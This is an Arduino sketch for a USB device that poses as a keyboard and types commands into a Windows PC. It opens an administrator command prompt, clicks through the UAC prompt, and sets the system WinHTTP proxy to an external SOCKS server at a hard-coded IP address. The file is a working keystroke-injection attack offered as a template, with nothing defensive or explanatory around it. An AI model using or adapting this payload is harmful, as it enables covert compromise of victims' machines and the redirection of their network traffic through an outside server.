#include <Keyboard.h>

void setup() {

	/*
	Start cli prompt here
	Use delay to fix problems
	*/

	Keyboard.begin();
	delay(1000);

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.releaseAll();
	delay(2000);

	Keyboard.print("cmd");
	delay(200);

	Keyboard.press(KEY_LEFT_CTRL);
	Keyboard.press(KEY_LEFT_SHIFT);
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(4000);
	
	Keyboard.press(KEY_LEFT_ARROW);
	Keyboard.releaseAll();
	delay(500);

	Keyboard.press(KEY_RETURN);
	delay(500);

	Keyboard.releaseAll();
	delay(500);

	/*
	Your code here
	Use delay to fix problems
	*/
	
	delay(1000);
	Keyboard.print("netsh winhttp show proxy");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

	delay(200);
	Keyboard.print("netsh winhttp reset proxy");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

	delay(200);
	Keyboard.print("netsh winhttp set proxy proxy-server='socks=213.177.105.14:1080'");
	Keyboard.press(KEY_RETURN);

	Keyboard.releaseAll();


}

void loop() {
	

}
